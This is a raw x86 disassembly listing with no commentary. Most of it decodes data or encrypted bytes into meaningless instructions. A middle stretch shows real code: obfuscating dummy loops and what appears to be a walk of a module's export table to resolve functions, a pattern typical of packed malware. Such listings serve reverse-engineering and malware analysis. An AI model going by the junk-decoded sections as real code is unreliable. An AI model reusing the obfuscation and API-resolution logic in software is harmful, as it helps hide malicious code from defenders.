  40cc09:	mov    ah,0x94
  40cc0b:	mov    eax,0xc79f755c
  40cc10:	adc    DWORD PTR [ecx],eax
  40cc12:	xchg   edi,eax
  40cc13:	add    BYTE PTR [edx],cl
  40cc15:	addr16 dec ebp
  40cc17:	call   0x316e4141
  40cc1c:	in     al,0x7d
  40cc1e:	inc    ebx
  40cc1f:	loop   0x40cc6a
  40cc21:	inc    ecx
  40cc22:	bound  ecx,QWORD PTR [eax+0x6d3847c1]
  40cc28:	rol    esp,0xc8
  40cc2b:	dec    eax
  40cc2c:	cmc    
  40cc2d:	cld    
  40cc2e:	adc    al,0x14
  40cc30:	adc    BYTE PTR [ebx+0x344d318d],ah
  40cc36:	rcr    DWORD PTR [esi],1
  40cc38:	lods   eax,DWORD PTR ds:[esi]
  40cc39:	adc    ecx,DWORD PTR ds:0x3b58264f
  40cc3f:	(bad)  
  40cc40:	(bad)  
  40cc41:	sub    ch,BYTE PTR [eax]
  40cc43:	fwait
  40cc44:	push   0xffffffb5
  40cc46:	retf   
  40cc47:	cmp    eax,0xa47fcf8a
  40cc4c:	test   al,0xc7
  40cc4e:	call   0x86d4ac7d
  40cc53:	bound  edi,QWORD PTR [ebx-0x7f]
  40cc56:	jbe    0x40cc39
  40cc58:	mov    dh,0x8
  40cc5a:	mov    esp,0xf7f641f9
  40cc5f:	lods   al,BYTE PTR ds:[esi]
  40cc60:	inc    ecx
  40cc61:	and    dh,bh
  40cc63:	retf   
  40cc64:	test   edi,0x399d6a83
  40cc6a:	xchg   edi,eax
  40cc6b:	push   ss
  40cc6c:	cmp    BYTE PTR [edx-0x60e91e26],cl
  40cc72:	add    al,BYTE PTR [edi-0x5e]
  40cc75:	push   esi
  40cc76:	sbb    eax,0x910667a4
  40cc7b:	dec    ebp
  40cc7c:	and    al,0x62
  40cc7e:	mov    bl,BYTE PTR [edx-0x1251d8fb]
  40cc84:	cmp    al,0x2e
  40cc86:	lock adc al,0xa0
  40cc89:	out    dx,eax
  40cc8a:	mov    dh,0xe0
  40cc8c:	add    dh,bh
  40cc8e:	jmp    0x25c44bab
  40cc93:	test   al,0xcd
  40cc95:	dec    edi
  40cc96:	sbb    eax,0xc9b8fbb8
  40cc9b:	mov    ch,BYTE PTR [eax]
  40cc9d:	mov    ds:0xae6e2bf9,eax
  40cca2:	sub    DWORD PTR [edx],esi
  40cca4:	out    dx,eax
  40cca5:	rcr    BYTE PTR [ebx-0x59460ecf],1
  40ccab:	mov    dl,0xb6
  40ccad:	jmp    0x40cd02
  40ccaf:	sbb    BYTE PTR [edi-0x66],0x41
  40ccb3:	jns    0x40cc50
  40ccb5:	inc    edx
  40ccb6:	xchg   DWORD PTR [ebx-0x1af022a6],edx
  40ccbc:	cli    
  40ccbd:	popf   
  40ccbe:	ins    DWORD PTR es:[edi],dx
  40ccbf:	nop
  40ccc0:	retf   0x6532
  40ccc3:	adc    dh,BYTE PTR [eax]
  40ccc5:	test   eax,0x815a7d0d
  40ccca:	icebp  
  40cccb:	mov    eax,0x3a242364
  40ccd0:	mov    dh,0x1a
  40ccd2:	cmp    dh,cl
  40ccd4:	clc    
  40ccd5:	outs   dx,DWORD PTR ds:[esi]
  40ccd6:	jnp    0x40ccd2
  40ccd8:	das    
  40ccd9:	jmp    0xf9b5:0x12c659ff
  40cce0:	stos   DWORD PTR es:[edi],eax
  40cce1:	out    dx,eax
  40cce2:	cmp    DWORD PTR [ecx+0x176c66ae],ecx
  40cce8:	push   ebx
  40cce9:	jge    0x40ccba
  40cceb:	in     eax,dx
  40ccec:	mov    eax,0x10b92a89
  40ccf1:	rcr    eax,1
  40ccf3:	dec    esi
  40ccf4:	loopne 0x40ccc1
  40ccf6:	ins    BYTE PTR es:[edi],dx
  40ccf7:	shl    esp,1
  40ccf9:	cmp    eax,0x9eb32254
  40ccfe:	dec    esi
  40ccff:	jns    0x40cd08
  40cd01:	bound  edx,QWORD PTR [esp+ebx*1+0x48]
  40cd05:	in     al,dx
  40cd06:	jnp    0x40cc9d
  40cd08:	sub    edx,DWORD PTR [ebp+0x11]
  40cd0b:	fcom   QWORD PTR [ebp-0x7]
  40cd0e:	rcl    al,cl
  40cd10:	ss push 0x35921063
  40cd16:	add    BYTE PTR ds:0x7ce4efd2,bh
  40cd1c:	aad    0xda
  40cd1e:	jo     0x40cd1a
  40cd20:	push   0x6e5d5133
  40cd25:	jb     0x40ccfd
  40cd27:	inc    edi
  40cd28:	sbb    ch,BYTE PTR [edx-0x7c]
  40cd2b:	ins    DWORD PTR es:[edi],dx
  40cd2c:	mov    ch,0x23
  40cd2e:	inc    esp
  40cd2f:	mov    dl,0xf8
  40cd31:	add    ebp,DWORD PTR [ebp-0x43183196]
  40cd37:	shr    DWORD PTR [esi+0x7d2df5a3],1
  40cd3d:	push   0x66
  40cd3f:	aam    0x99
  40cd41:	dec    edx
  40cd42:	inc    edx
  40cd43:	shl    bl,0x85
  40cd46:	adc    eax,0x406a6b11
  40cd4b:	adc    ebx,0x2d
  40cd4e:	push   eax
  40cd4f:	mov    al,0x4b
  40cd51:	loopne 0x40cd86
  40cd53:	sub    ecx,esp
  40cd55:	or     al,0x39
  40cd57:	std    
  40cd58:	clc    
  40cd59:	and    edi,0xc61b9ccf
  40cd5f:	pop    ecx
  40cd60:	addr16 lock mov al,0xd0
  40cd64:	fmul   DWORD PTR [eax-0x2f09a86a]
  40cd6a:	sbb    bl,BYTE PTR [edx+ebx*1-0x6a]
  40cd6e:	add    dh,dh
  40cd70:	js     0x40ccfd
  40cd72:	test   DWORD PTR ds:0xa6da1938,eax
  40cd78:	add    edx,DWORD PTR [ebp+eax*8+0x15]
  40cd7c:	sub    al,0xd2
  40cd7e:	inc    edi
  40cd7f:	adc    DWORD PTR [esi-0x1],ecx
  40cd82:	out    0xf7,al
  40cd84:	clc    
  40cd85:	dec    ecx
  40cd86:	pop    ebx
  40cd87:	push   bp
  40cd89:	fmul   DWORD PTR [edi]
  40cd8b:	or     BYTE PTR [esi+0x62cc93b3],0x84
  40cd92:	push   0xfffffff5
  40cd94:	fsubr  DWORD PTR [edx-0x2b]
  40cd97:	(bad)  
  40cd98:	push   esi
  40cd99:	and    DWORD PTR [esi],esp
  40cd9b:	call   0x5c3b6aa1
  40cda0:	and    ebp,DWORD PTR [edi]
  40cda2:	iret   
  40cda3:	mov    dl,0x66
  40cda5:	or     cl,BYTE PTR [ebx-0x53]
  40cda8:	data16 mov ss,WORD PTR [ecx-0x4f]
  40cdac:	mov    ds,ebx
  40cdae:	sbb    edi,edi
  40cdb0:	push   ebx
  40cdb1:	dec    ebx
  40cdb2:	aad    0xb9
  40cdb4:	sbb    DWORD PTR gs:[edx-0xf60fc6e],edi
  40cdbb:	dec    eax
  40cdbc:	mov    ebp,0xa4d10962
  40cdc1:	es fwait
  40cdc3:	jecxz  0x40cd95
  40cdc5:	pop    edi
  40cdc6:	jmp    0x40cda2
  40cdc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdc9:	mov    esi,0xe4b3ff58
  40cdce:	test   eax,0x92d76c79
  40cdd3:	adc    ebp,DWORD PTR [eax]
  40cdd5:	leave  
  40cdd6:	clc    
  40cdd7:	pop    ecx
  40cdd8:	pop    edi
  40cdd9:	jne    0x40cd84
  40cddb:	mov    ecx,0xa70619ad
  40cde0:	mov    ecx,0x819a6b60
  40cde5:	inc    ebx
  40cde6:	sbb    eax,0x36b56585
  40cdeb:	pop    eax
  40cdec:	daa    
  40cded:	sub    BYTE PTR [edi+0x71],bl
  40cdf0:	mov    cl,0xa4
  40cdf2:	pusha  
  40cdf3:	xor    eax,0x17ad5bcc
  40cdf8:	stos   BYTE PTR es:[edi],al
  40cdf9:	retf   0xc009
  40cdfc:	ficomp DWORD PTR ss:[eax-0x5b]
  40ce00:	mov    bl,0x4
  40ce02:	adc    al,0x24
  40ce04:	mov    ch,0x90
  40ce06:	sub    ah,cl
  40ce08:	scas   al,BYTE PTR es:[edi]
  40ce09:	and    al,0x4d
  40ce0b:	jae    0x40cdc6
  40ce0d:	mov    DWORD PTR [eax],esp
  40ce0f:	fisubr DWORD PTR [edi-0x1f]
  40ce12:	lods   al,BYTE PTR ds:[esi]
  40ce13:	loopne 0x40ce93
  40ce15:	int3   
  40ce16:	inc    edi
  40ce17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce18:	sbb    esp,ecx
  40ce1a:	mov    DWORD PTR [edi+ebp*2],edi
  40ce1d:	ins    BYTE PTR es:[edi],dx
  40ce1e:	jl     0x40ce65
  40ce20:	daa    
  40ce21:	mov    esi,0xdb4af749
  40ce26:	dec    esp
  40ce27:	and    eax,0xa0b1f8e5
  40ce2c:	lds    ecx,FWORD PTR [eax-0x23]
  40ce2f:	das    
  40ce30:	cwde   
  40ce31:	xchg   esp,eax
  40ce32:	(bad)  
  40ce34:	jno    0x40cdb7
  40ce36:	fsubr  DWORD PTR [ecx]
  40ce38:	or     al,0x4b
  40ce3a:	popf   
  40ce3b:	jg     0x40cdef
  40ce3d:	sub    eax,0xfbb38a51
  40ce42:	mov    WORD PTR [edx-0x1142f11a],?
  40ce48:	rcl    DWORD PTR [eax+0x3a6e11e6],cl
  40ce4e:	mov    al,0xdf
  40ce50:	ja     0x40ce1c
  40ce52:	rol    BYTE PTR fs:[edi-0x77],cl
  40ce56:	add    ecx,DWORD PTR [esi]
  40ce58:	adc    DWORD PTR [ecx],ebx
  40ce5a:	or     bl,0x17
  40ce5d:	mov    cl,0xce
  40ce5f:	xlat   BYTE PTR ds:[ebx]
  40ce60:	mov    al,0x92
  40ce62:	in     al,dx
  40ce63:	pop    edx
  40ce64:	pop    ds
  40ce65:	fiadd  WORD PTR [ecx+0x4b]
  40ce68:	cs int 0x76
  40ce6b:	bound  ebp,QWORD PTR [edx]
  40ce6d:	xor    ebx,DWORD PTR [eax+edx*2+0x610ceb2a]
  40ce74:	in     eax,0xe
  40ce76:	out    dx,eax
  40ce77:	or     eax,DWORD PTR [ebp-0x35a1fd3d]
  40ce7d:	in     al,0x7
  40ce7f:	lea    eax,[edx]
  40ce81:	mov    bh,0x8
  40ce83:	pop    ss
  40ce84:	xor    al,0xc6
  40ce86:	xor    ch,dh
  40ce88:	sub    DWORD PTR [edx+0x3d4a9f47],ebp
  40ce8e:	pop    ecx
  40ce8f:	push   cs
  40ce90:	pop    ebp
  40ce91:	in     eax,dx
  40ce92:	scas   al,BYTE PTR es:[edi]
  40ce93:	lods   eax,DWORD PTR ds:[esi]
  40ce94:	cmp    eax,0xdec1293b
  40ce99:	mov    eax,DWORD PTR [ebp-0x4]
  40ce9c:	mov    DWORD PTR ds:0x428eab,0x1e
  40cea6:	cmp    DWORD PTR ds:0x428eab,0x0
  40cead:	je     0x40cee0
  40ceb3:	cmp    DWORD PTR ds:0x428eab,0x2d
  40ceba:	ja     0x40cee0
  40cec0:	jmp    0x40cece
  40cec5:	push   DWORD PTR [ebp-0x24]
  40cec8:	call   DWORD PTR ds:0x42a9c3
  40cece:	mov    ebx,DWORD PTR ds:0x428eab
  40ced4:	dec    ebx
  40ced5:	mov    DWORD PTR ds:0x428eab,ebx
  40cedb:	jmp    0x40cea6
  40cee0:	xor    eax,esi
  40cee2:	add    eax,edi
  40cee4:	or     ebx,0x4a81
  40ceea:	mov    DWORD PTR [ebp-0x30],eax
  40ceed:	mov    ebx,DWORD PTR [ebp-0x4]
  40cef0:	or     eax,DWORD PTR ds:0x428e7b
  40cef6:	xor    ebx,esi
  40cef8:	and    DWORD PTR ds:0x428e6b,0x0
  40cf02:	jmp    0x40cf12
  40cf07:	mov    eax,ds:0x428e6b
  40cf0c:	inc    eax
  40cf0d:	mov    ds:0x428e6b,eax
  40cf12:	cmp    DWORD PTR ds:0x428e6b,0x19
  40cf19:	jae    0x40cf59
  40cf1f:	cmp    DWORD PTR ds:0x428e6b,0x8
  40cf26:	jl     0x40cf59
  40cf2c:	jmp    0x40cf3c
  40cf31:	push   0x428189
  40cf36:	call   DWORD PTR ds:0x42a9cb
  40cf3c:	cmp    DWORD PTR ds:0x428e6b,0x7
  40cf43:	jne    0x40cf54
  40cf49:	mov    eax,ds:0x428e6b
  40cf4e:	inc    eax
  40cf4f:	mov    ds:0x428e6b,eax
  40cf54:	jmp    0x40cf07
  40cf59:	add    ebx,edi
  40cf5b:	sub    DWORD PTR ds:0x428e8b,ebx
  40cf61:	mov    eax,DWORD PTR [ebp-0x24]
  40cf64:	xor    DWORD PTR ds:0x428ebb,0x518c
  40cf6e:	sub    eax,edi
  40cf70:	lea    ecx,[ebx-0x3272f6]
  40cf76:	xor    eax,esi
  40cf78:	xor    DWORD PTR ds:0x428e67,0x744d
  40cf82:	xor    ecx,esi
  40cf84:	mov    DWORD PTR ds:0x428eb3,0x57aa
  40cf8e:	cmp    ecx,eax
  40cf90:	mov    DWORD PTR ds:0x428e8f,0x2448
  40cf9a:	je     0x40d1fa
  40cfa0:	mov    eax,ds:0x428ebb
  40cfa5:	and    DWORD PTR ds:0x428e2f,eax
  40cfab:	mov    eax,DWORD PTR [ebp-0x4]
  40cfae:	neg    DWORD PTR ds:0x428e73
  40cfb4:	xor    eax,esi
  40cfb6:	inc    DWORD PTR ds:0x428e43
  40cfbc:	add    eax,edi
  40cfbe:	mov    DWORD PTR ds:0x428eab,0x7b11
  40cfc8:	cmp    ebx,eax
  40cfca:	jne    0x40d1d7
  40cfd0:	xor    DWORD PTR ds:0x428e37,0x428e63
  40cfda:	push   DWORD PTR [ebp+0x8]
  40cfdd:	xor    DWORD PTR ds:0x428e83,0x428eaf
  40cfe7:	call   0x421aa4
  40cfec:	or     ecx,DWORD PTR ds:0x428ecb
  40cff2:	mov    DWORD PTR [ebp-0x14],eax
  40cff5:	mov    eax,DWORD PTR [ebp-0x4]
  40cff8:	and    DWORD PTR ds:0x428e97,0x0
  40d002:	mov    ecx,DWORD PTR ds:0x428e97
  40d008:	inc    ecx
  40d009:	mov    DWORD PTR ds:0x428e97,ecx
  40d00f:	cmp    DWORD PTR ds:0x428e97,0x8
  40d016:	jg     0x40d055
  40d01c:	jmp    0x40d02c
  40d021:	push   0x2d20
  40d026:	call   DWORD PTR ds:0x42a9cf
  40d02c:	cmp    DWORD PTR ds:0x428e97,0x7
  40d033:	jne    0x40d048
  40d039:	xor    ecx,ecx
  40d03b:	xor    ecx,DWORD PTR ds:0x428e97
  40d041:	inc    ecx
  40d042:	mov    DWORD PTR ds:0x428e97,ecx
  40d048:	cmp    DWORD PTR ds:0x428e97,0x16
  40d04f:	jb     0x40d002
  40d055:	mov    ecx,DWORD PTR [ebp-0x14]
  40d058:	xor    eax,esi
  40d05a:	sbb    DWORD PTR ds:0x428e33,0x7710
  40d064:	add    eax,edi
  40d066:	cmp    ecx,eax
  40d068:	mov    DWORD PTR ds:0x428e93,0x6f23
  40d072:	je     0x40f614
  40d078:	push   DWORD PTR [ebp-0x14]
  40d07b:	xor    DWORD PTR ds:0x428e33,0x5f29
  40d085:	push   DWORD PTR [ebp+0x8]
  40d088:	call   0x423e95
  40d08d:	mov    DWORD PTR [ebp-0x14],eax
  40d090:	mov    eax,DWORD PTR [ebp-0x4]
  40d093:	mov    ecx,DWORD PTR ds:0x428e93
  40d099:	and    DWORD PTR ds:0x428e8b,ecx
  40d09f:	mov    ecx,DWORD PTR [ebp-0x14]
  40d0a2:	neg    DWORD PTR ds:0x428e6b
  40d0a8:	xor    eax,esi
  40d0aa:	sub    DWORD PTR ds:0x428e8b,0x59e8
  40d0b4:	add    eax,edi
  40d0b6:	cmp    ecx,eax
  40d0b8:	je     0x40f614
  40d0be:	and    DWORD PTR ds:0x428e63,0x0
  40d0c8:	jmp    0x40d0da
  40d0cd:	mov    ecx,DWORD PTR ds:0x428e63
  40d0d3:	inc    ecx
  40d0d4:	mov    DWORD PTR ds:0x428e63,ecx
  40d0da:	cmp    DWORD PTR ds:0x428e63,0x14
  40d0e1:	jae    0x40d123
  40d0e7:	cmp    DWORD PTR ds:0x428e63,0xb
  40d0ee:	jbe    0x40d123
  40d0f4:	jmp    0x40d104
  40d0f9:	push   0x4280f7
  40d0fe:	call   DWORD PTR ds:0x42a9d3
  40d104:	cmp    DWORD PTR ds:0x428e63,0xa
  40d10b:	jne    0x40d11e
  40d111:	mov    ecx,DWORD PTR ds:0x428e63
  40d117:	inc    ecx
  40d118:	mov    DWORD PTR ds:0x428e63,ecx
  40d11e:	jmp    0x40d0cd
  40d123:	mov    eax,DWORD PTR [ebp-0x14]
  40d126:	mov    eax,DWORD PTR [eax+0x18]
  40d129:	mov    DWORD PTR [ebp-0x24],eax
  40d12c:	or     ecx,0x560
  40d132:	mov    eax,DWORD PTR [ebp-0x14]
  40d135:	adc    ecx,DWORD PTR ds:0x428e9f
  40d13b:	mov    ecx,DWORD PTR [ebp+0x8]
  40d13e:	add    ecx,DWORD PTR [eax+0x20]
  40d141:	xor    eax,eax
  40d143:	xor    eax,DWORD PTR ds:0x428e7b
  40d149:	sbb    eax,DWORD PTR ds:0x428e67
  40d14f:	mov    ds:0x428e7b,eax
  40d154:	mov    DWORD PTR [ebp-0x2c],ecx
  40d157:	dec    ecx
  40d158:	mov    eax,DWORD PTR [ebp-0x14]
  40d15b:	add    ecx,0x1e8d
  40d161:	mov    ecx,DWORD PTR [ebp+0x8]
  40d164:	add    ecx,DWORD PTR [eax+0x24]
  40d167:	and    DWORD PTR ds:0x428e3b,0x0
  40d171:	mov    eax,ds:0x428e3b
  40d176:	inc    eax
  40d177:	mov    ds:0x428e3b,eax
  40d17c:	cmp    DWORD PTR ds:0x428e3b,0x2c
  40d183:	ja     0x40d1a4
  40d189:	jmp    0x40d197
  40d18e:	push   DWORD PTR [ebp-0x14]
  40d191:	call   DWORD PTR ds:0x42a9d7
  40d197:	cmp    DWORD PTR ds:0x428e3b,0x1f
  40d19e:	jb     0x40d171
  40d1a4:	mov    DWORD PTR [ebp-0x34],ecx
  40d1a7:	mov    eax,ds:0x428e3b
  40d1ac:	and    DWORD PTR ds:0x428e87,eax
  40d1b2:	mov    eax,DWORD PTR [ebp-0x14]
  40d1b5:	xor    DWORD PTR ds:0x428e73,0x264d
  40d1bf:	mov    ecx,DWORD PTR [ebp+0x8]
  40d1c2:	add    ecx,DWORD PTR [eax+0x1c]
  40d1c5:	mov    DWORD PTR ds:0x428e57,0x2595
  40d1cf:	mov    DWORD PTR [ebp-0x14],ecx
  40d1d2:	jmp    0x40f5dc
  40d1d7:	mov    eax,DWORD PTR [ebp-0x2c]
  40d1da:	mov    ecx,DWORD PTR [ebp+0x8]
  40d1dd:	add    ecx,DWORD PTR [eax+ebx*4]
  40d1e0:	mov    DWORD PTR [ebp-0x28],ecx
  40d1e3:	mov    eax,DWORD PTR [ebp-0x4]
  40d1e6:	mov    ecx,DWORD PTR [ebp-0x28]
  40d1e9:	xor    eax,esi
  40d1eb:	add    eax,edi
  40d1ed:	cmp    ecx,eax
  40d1ef:	je     0x40f5dc
  40d1f5:	jmp    0x40f5cd
  40d1fa:	mov    eax,DWORD PTR [ebp-0x4]
  40d1fd:	mov    ecx,DWORD PTR [ebp-0x8]
  40d200:	xor    eax,esi
  40d202:	add    eax,edi
  40d204:	jmp    0x40f5b3
  40d209:	jns    0x40d251
  40d20b:	mov    esp,0x14898cd9
  40d210:	(bad)  
  40d211:	mov    es,WORD PTR [eax-0x56eceead]
  40d217:	mov    edx,0x83d2555e
  40d21c:	xor    ecx,0x60
  40d21f:	add    DWORD PTR [ebx-0x604448a8],0x28
  40d226:	adc    DWORD PTR [edx+0x44],0xd359da02
  40d22d:	add    BYTE PTR [esi],dh
  40d22f:	pop    edx
  40d230:	push   esp
  40d231:	gs dec edi
  40d233:	pop    ebx
  40d234:	icebp  
  40d235:	pop    es
  40d236:	aas    
  40d237:	in     al,dx
  40d238:	ins    DWORD PTR es:[edi],dx
  40d239:	imul   ebp,ecx,0xffffffbe
  40d23c:	ins    BYTE PTR es:[edi],dx
  40d23d:	mov    bh,0x9f
  40d23f:	sbb    edx,ebp
  40d241:	sub    BYTE PTR [ecx],ch
  40d243:	shl    esi,0x0
  40d246:	test   eax,0xe6991519
  40d24b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d24c:	fxch   st(4)
  40d24e:	jp     0x40d29f
  40d250:	jnp    0x40d21f
  40d252:	mov    cl,0x1f
  40d254:	sub    DWORD PTR [ecx+0x36],edi
  40d257:	gs dec esp
  40d259:	ret    0x8048
  40d25c:	jb     0x40d236
  40d25e:	cs ins BYTE PTR es:[edi],dx
  40d260:	mov    al,0x12
  40d262:	xchg   ebx,eax
  40d263:	xor    BYTE PTR [ebp-0x47],ch
  40d266:	je     0x40d264
  40d268:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d269:	mov    ebx,0xba275dfd
  40d26e:	je     0x40d270
  40d270:	mov    ds:0x371540f1,eax
  40d275:	jnp    0x40d25f
  40d277:	mov    dh,0x21
  40d279:	dec    ecx
  40d27a:	jns    0x40d2e7
  40d27c:	or     eax,0x1ad675ab
  40d281:	sahf   
  40d282:	popa   
  40d283:	lss    edi,FWORD PTR [edi]
  40d286:	loope  0x40d268
  40d288:	add    edx,DWORD PTR [ebx]
  40d28a:	mov    ds:0xbd2d573,al
  40d28f:	jno    0x40d284
  40d291:	imul   edx,DWORD PTR [ecx],0x2a
  40d294:	mov    bh,0x77
  40d296:	ret    
  40d297:	xor    dh,BYTE PTR [esi+edi*2]
  40d29a:	jns    0x40d2c5
  40d29c:	(bad)  
  40d29d:	popf   
  40d29e:	stos   BYTE PTR es:[edi],al
  40d29f:	dec    edi
  40d2a0:	bound  di,DWORD PTR [ecx-0x1]
  40d2a4:	js     0x40d27f
  40d2a6:	mov    ebp,0xf5413422
  40d2ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2ac:	jmp    0xff290ca8
  40d2b1:	rol    eax,cl
  40d2b3:	in     eax,0x6c
  40d2b5:	popa   
  40d2b6:	mov    al,ds:0x73c9ac7d
  40d2bb:	into   
  40d2bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2bd:	and    al,0x43
  40d2bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2c0:	in     eax,dx
  40d2c1:	arpl   si,bx
  40d2c3:	mov    dh,0x6d
  40d2c5:	cmp    DWORD PTR [ebp+ecx*2-0x63],ecx
  40d2c9:	sbb    al,0x72
  40d2cb:	or     esp,DWORD PTR [edi]
  40d2cd:	xchg   edx,eax
  40d2ce:	int3   
  40d2cf:	sbb    BYTE PTR [edi-0x79c52b7e],bl
  40d2d5:	jmp    0x8ef5:0x88ff9670
  40d2dc:	or     DWORD PTR [ebx+0x42],0x71b73c1a
  40d2e3:	test   DWORD PTR [esp+ecx*4],esp
  40d2e6:	or     ecx,DWORD PTR [edi-0x50c834af]
  40d2ec:	hlt    
  40d2ed:	call   0x781d1b72
  40d2f2:	pop    esi
  40d2f3:	add    ebx,DWORD PTR es:[ecx-0x35]
  40d2f7:	xor    BYTE PTR [edx+edi*2+0x6b],0x39
  40d2fc:	pop    ebx
  40d2fd:	mov    edx,0x241e11e6
  40d302:	xor    eax,0x8aee048f
  40d307:	add    al,0xe4
  40d309:	and    bl,bl
  40d30b:	or     dh,BYTE PTR [ecx+0x1efc6232]
  40d311:	pushf  
  40d312:	pushf  
  40d313:	pop    eax
  40d314:	xor    DWORD PTR [esi+0x30ef26f3],ecx
  40d31a:	xchg   ecx,eax
  40d31b:	dec    edx
  40d31c:	pop    es
  40d31d:	imul   dl
  40d31f:	or     DWORD PTR [edi+eiz*4-0x4d598987],0xb3f2315d
  40d32a:	xor    edx,DWORD PTR [edi+0x1e3edb34]
  40d330:	mov    BYTE PTR [esi+0x97c992a],ah
  40d336:	ins    BYTE PTR es:[edi],dx
  40d337:	inc    esp
  40d338:	pop    ds
  40d339:	ret    0xc3a1
  40d33c:	mov    cl,al
  40d33e:	mov    bh,0xec
  40d340:	mov    eax,0xaf71a9f7
  40d345:	loope  0x40d346
  40d347:	aaa    
  40d348:	fucom  st(2)
  40d34a:	rcl    DWORD PTR [ebp-0x2f7276cd],cl
  40d350:	pop    edx
  40d351:	cmp    al,0x14
  40d353:	pop    edx
  40d354:	ins    BYTE PTR es:[edi],dx
  40d355:	(bad)  
  40d356:	fnsave [eax-0x5]
  40d359:	inc    esi
  40d35a:	cmp    ebx,DWORD PTR [edi+eax*1]
  40d35d:	popf   
  40d35e:	in     al,dx
  40d35f:	rcr    DWORD PTR [eax],1
  40d361:	sar    ebx,1
  40d363:	and    DWORD PTR [eax],ecx
  40d365:	dec    esp
  40d366:	push   edx
  40d367:	push   esi
  40d368:	ins    BYTE PTR es:[edi],dx
  40d369:	mov    ah,0x75
  40d36b:	jl     0x40d337
  40d36d:	sar    al,cl
  40d36f:	mov    dh,0xb0
  40d371:	test   eax,0xde9db4b2
  40d376:	adc    DWORD PTR ds:0xde4b037d,esp
  40d37c:	das    
  40d37d:	jnp    0x40d36c
  40d37f:	sub    al,0x9
  40d381:	pusha  
  40d382:	call   0xea22e4cb
  40d387:	mov    ebp,0xdf1ded41
  40d38c:	loopne 0x40d38e
  40d38e:	cmp    esi,DWORD PTR cs:[ebp-0x6c]
  40d392:	jno    0x40d3a5
  40d394:	mov    esi,DWORD PTR [esi+0x198b2d98]
  40d39a:	push   esi
  40d39b:	shl    DWORD PTR [eax],1
  40d39d:	cmp    eax,DWORD PTR [ebp-0x50c7667a]
  40d3a3:	sub    DWORD PTR [edx-0x4473ab79],ebp
  40d3a9:	lock (bad) 
  40d3ab:	shr    bh,cl
  40d3ad:	add    BYTE PTR [ebx],dh
  40d3af:	xlat   BYTE PTR ds:[ebx]
  40d3b0:	push   cs
  40d3b1:	jge    0x40d42d
  40d3b3:	mov    DWORD PTR [ebp+0xe3127ae],0xd632e6b7
  40d3bd:	inc    esp
  40d3be:	scas   eax,DWORD PTR es:[edi]
  40d3bf:	push   es
  40d3c0:	imul   ecx,DWORD PTR [ecx-0x44],0xffffffca
  40d3c4:	sbb    eax,edi
  40d3c6:	ret    
  40d3c7:	push   ebx
  40d3c8:	cmp    esp,DWORD PTR [eax-0xf]
  40d3cb:	mov    dl,0xcc
  40d3cd:	xor    DWORD PTR [ebx+0x7a],edi
  40d3d0:	or     bh,BYTE PTR [ecx-0x6f]
  40d3d3:	leave  
  40d3d4:	jae    0x40d3e5
  40d3d6:	(bad)  
  40d3d7:	aam    0x66
  40d3d9:	into   
  40d3da:	mov    ebx,0xc44d3456
  40d3df:	loop   0x40d361
  40d3e1:	push   ecx
  40d3e2:	mov    ebp,DWORD PTR [ebp+0x29]
  40d3e5:	popa   
  40d3e6:	loope  0x40d3bd
  40d3e8:	inc    esp
  40d3e9:	jmp    0xa3dd:0xd7532f5b
  40d3f0:	out    dx,eax
  40d3f1:	jns    0x40d38d
  40d3f3:	adc    DWORD PTR [ebx-0x31b09d51],eax
  40d3f9:	push   ecx
  40d3fa:	inc    edx
  40d3fb:	call   0xd406:0x28cdd17b
  40d402:	ins    BYTE PTR es:[edi],dx
  40d403:	jo     0x40d41c
  40d405:	and    bh,dh
  40d407:	(bad)  
  40d408:	(bad)  
  40d409:	test   eax,0xc894b3c6
  40d40e:	enter  0xfbc7,0x94
  40d412:	pop    eax
  40d413:	inc    ebp
  40d414:	pop    ebp
  40d415:	ret    
  40d416:	icebp  
  40d417:	loopne 0x40d463
  40d419:	pop    edx
  40d41a:	mov    edx,0xb6d4ab4
  40d41f:	cmp    edx,DWORD PTR [ebx+edx*8-0x66]
  40d423:	mov    eax,0xd84394dd
  40d428:	aaa    
  40d429:	inc    ecx
  40d42a:	mov    ah,0x54
  40d42c:	xor    al,0xe5
  40d42e:	xchg   ebp,eax
  40d42f:	clc    
  40d430:	cli    
  40d431:	test   al,0xdc
  40d433:	xchg   ecx,eax
  40d434:	loope  0x40d497
  40d436:	js     0x40d3f1
  40d438:	je     0x40d4a0
  40d43a:	test   al,0xc1
  40d43c:	mov    dl,0x82
  40d43e:	sar    DWORD PTR [esp+ebx*4],cl
  40d441:	mov    dl,0xb3
  40d443:	fst    DWORD PTR [edi-0x19]
  40d446:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d447:	dec    ebx
  40d448:	sub    eax,0x28793720
  40d44d:	pop    ds
  40d44e:	jbe    0x40d426
  40d450:	shr    ah,0xa2
  40d453:	sti    
  40d454:	jno    0x40d428
  40d456:	push   cs
  40d457:	or     edi,esi
  40d459:	pop    es
  40d45a:	or     ch,BYTE PTR [esp+eiz*8+0x344e72af]
  40d461:	dec    esi
  40d462:	pushf  
  40d463:	jecxz  0x40d4b1
  40d465:	ret    0x3f79
  40d468:	sub    ebx,edx
  40d46a:	push   0xd07db12
  40d46f:	dec    ebx
  40d470:	mov    edx,0xb7145a32
  40d475:	mov    ds:0xf7d34d01,al
  40d47a:	not    DWORD PTR [edi+0x5e]
  40d47d:	aad    0xf3
  40d47f:	outs   dx,DWORD PTR ds:[esi]
  40d480:	xchg   ebx,eax
  40d481:	call   0xb9f1:0xe5be0ad3
  40d488:	pusha  
  40d489:	dec    edx
  40d48a:	xor    DWORD PTR [ebx],edx
  40d48c:	inc    ebx
  40d48d:	retf   0xa270
  40d490:	mov    al,ds:0x16c2261b
  40d495:	mov    DWORD PTR ds:0x3758968,esi
  40d49b:	pop    ebp
  40d49c:	cli    
  40d49d:	xchg   ecx,eax
  40d49e:	repz push ecx
  40d4a0:	outs   dx,DWORD PTR ds:[esi]
  40d4a1:	inc    edx
  40d4a2:	pop    es
  40d4a3:	mov    al,ds:0x11d2f689
  40d4a8:	lock jge 0x40d465
  40d4ab:	std    
  40d4ac:	mov    bh,dl
  40d4ae:	inc    edi
